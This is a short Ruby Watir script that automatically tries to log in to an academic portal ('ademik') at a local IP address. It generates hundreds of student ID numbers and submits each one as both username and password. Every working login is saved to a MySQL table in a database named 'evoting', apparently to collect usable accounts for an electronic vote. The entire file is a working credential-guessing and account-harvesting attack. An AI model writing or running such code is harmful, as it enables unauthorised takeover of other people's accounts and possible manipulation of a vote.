require 'watir' # Crawler
require 'pry' # Ruby REPL
require 'rb-readline' # Ruby IRB
require 'awesome_print' # Console output
require 'watir-scroll'
require 'net/http'
require 'uri'
require 'json'
require 'mysql2' #database

client = Mysql2::Client.new(:host => "localhost", :username => "root", :password =>"", :database =>"evoting" )
@@baseUrl = "http://192.168.0.55/"
@@browser = Watir::Browser.new :chrome

# @@NIM = ['C1A1', 'C1B1', 'C1B3', 'C1D1', 'C1G1', 'C1E1' ]
@@NIM = ['C1C1', 'C1D3', 'C1F1', 'S1A1', 'C1D7', 'S1B1' ]
@@tahun = [ "19" ]
@@_end = 150

@@ii = 0
begin

    $i = 1
    begin
        @@no = $i.to_s.rjust(3, "0")
    
        nim = "#{@@NIM[@@ii]}" +"#{@@tahun[0]}"+"#{@@no}"
        pass = nim
        puts( nim )
        puts( "tables" )
    
        @@browser.goto @@baseUrl + "/index.php?exec=login"
        @@browser.text_field(:name => "NIP").set nim
        @@browser.text_field(:name => "password").set pass
        @@browser.input(:type => "submit" ).click 
    
        sleep(1)    
        if @@browser.table(:class => "main" ).exists?
            query = "INSERT INTO `users` (`id`, `nim`, `pass` ) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}' "+ ")"
            puts( query )
            
            client.query(query)
            @@browser.link(:href => "ademik.php?logout=1" ).click
            
        end
        sleep(2)
        $i +=1;
    end until $i > @@_end

    @@ii += 1
end until @@ii > @@NIM.length - 1

sleep(500)
